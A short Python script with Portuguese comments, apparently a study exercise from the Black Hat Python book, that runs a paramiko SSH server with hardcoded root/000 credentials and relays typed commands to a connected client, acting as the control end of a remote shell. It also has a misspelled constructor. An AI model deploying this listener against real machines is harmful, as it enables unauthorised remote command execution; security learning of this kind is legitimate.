import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

# Criando test_rsa.key [ssh-keygen -t rsa -f /home/kalilinux/Documents/L_Black_hat_python/43.SSH_Paramiko/test_rsa.key]
#   -> Não crie o arquivo com senha

class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        
    def check_auth_password(self, username, password):
        if (username == 'root') and (password == '000'):
            return paramiko.AUTH_SUCCESSFUL
        
if __name__ == '__main__':
    server = '192.168.1.12'
    ssh_port = 22
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Ouvindo conexões ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Falha na escuta: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Conexão estabelecida!', client, addr)
                    
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)

    if chan is None:
        print('*** Sem Canal.')
        sys.exit(1)

    print('[+] Autenticado!')
    print(chan.recv(1024))
    chan.send('Bem-vindo ao bh_ssh')
    try:
        while True:
            command= input("Insira o comando: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()